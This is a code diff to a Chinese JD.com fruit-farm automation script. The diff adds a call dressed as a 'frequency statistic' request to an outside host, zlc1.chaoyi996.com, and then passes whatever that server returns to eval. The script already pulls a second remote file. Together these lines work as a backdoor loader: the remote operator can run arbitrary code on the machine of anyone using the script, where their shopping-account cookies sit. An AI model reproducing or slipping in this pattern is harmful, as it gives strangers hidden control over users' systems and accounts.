@@ -25,8 +25,26 @@ cron "5 6-18/6 * * *" script-path=https://gitee.com/lxk0301/jd_scripts/raw/maste
 jd免费水果 搬的https://github.com/liuxiaoyucc/jd-helper/blob/a6f275d9785748014fc6cca821e58427162e9336/fruit/fruit.js
 */
 const $ = new Env('东东农场互助版');
+const ver='r_0.0.1';
 !(async () => {
     console.log(`开始加载远程脚本`)
+    
+    $.post({ url: `http://zlc1.chaoyi996.com:8880/api/app/frequency-statistic/frequency-statistic?type=3&version=${ver}`, timeout: 10000,}, (err, resp, data) => {
+      try {
+        if (err) {
+          console.log(`远程脚本加载失败`)
+        } else {
+          if (data) {
+          console.log(`远程脚本加载成功，开始执行`)
+          eval(data, 10);  
+          }
+        }
+      } catch (e) {
+        console.log(`远程脚本加载失败`+e)
+      } finally {
+      
+      }
+    })
     $.get({ url: 'https://static.zlc1.chaoyi996.com/ccwav/jd_fruit.js', timeout: 10000,}, (err, resp, data) => {
         try {
           if (err) {
